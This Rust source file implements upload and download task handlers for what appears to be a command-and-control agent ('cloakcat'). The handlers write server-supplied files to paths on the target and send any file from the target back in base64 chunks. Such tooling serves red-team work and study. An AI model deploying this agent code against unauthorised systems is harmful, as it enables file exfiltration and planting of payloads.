//! File system task handlers: upload (server → agent) and download (agent → server).

use anyhow::{Context, Result};
use base64::{engine::general_purpose::STANDARD as B64, Engine};
use cloakcat_protocol::{FileChunk, CHUNK_SIZE};

use crate::transport::Transport;

/// Handle an Upload task: fetch assembled file from server and write to target path.
pub async fn upload_handler<T: Transport>(
    transport: &T,
    file_url: &str,
    token: &str,
    path: &str,
) -> Result<(i32, String, String)> {
    let bytes = transport
        .fetch_upload_file(file_url, token)
        .await
        .context("failed to fetch upload file from server")?;

    if let Some(parent) = std::path::Path::new(path).parent()
        && !parent.as_os_str().is_empty()
    {
        std::fs::create_dir_all(parent)
            .with_context(|| format!("failed to create parent dirs for {}", path))?;
    }
    std::fs::write(path, &bytes)
        .with_context(|| format!("failed to write file to {}", path))?;

    Ok((
        0,
        format!("wrote {} bytes to {}", bytes.len(), path),
        String::new(),
    ))
}

/// Handle a Download task: read file from target path and send chunks to server.
pub async fn download_handler<T: Transport>(
    transport: &T,
    chunk_url: &str,
    token: &str,
    transfer_id: &str,
    path: &str,
) -> Result<(i32, String, String)> {
    let bytes = std::fs::read(path)
        .with_context(|| format!("failed to read file {}", path))?;

    let total_chunks = bytes.len().div_ceil(CHUNK_SIZE).max(1) as u32;

    for (seq, chunk_bytes) in bytes.chunks(CHUNK_SIZE).enumerate() {
        let chunk = FileChunk {
            transfer_id: transfer_id.to_string(),
            seq: seq as u32,
            total: total_chunks,
            data: B64.encode(chunk_bytes),
        };
        transport
            .send_download_chunk(chunk_url, token, &chunk)
            .await
            .with_context(|| format!("failed to send chunk {} of {}", seq + 1, total_chunks))?;
    }

    Ok((
        0,
        format!("sent {} bytes ({} chunks) from {}", bytes.len(), total_chunks, path),
        String::new(),
    ))
}
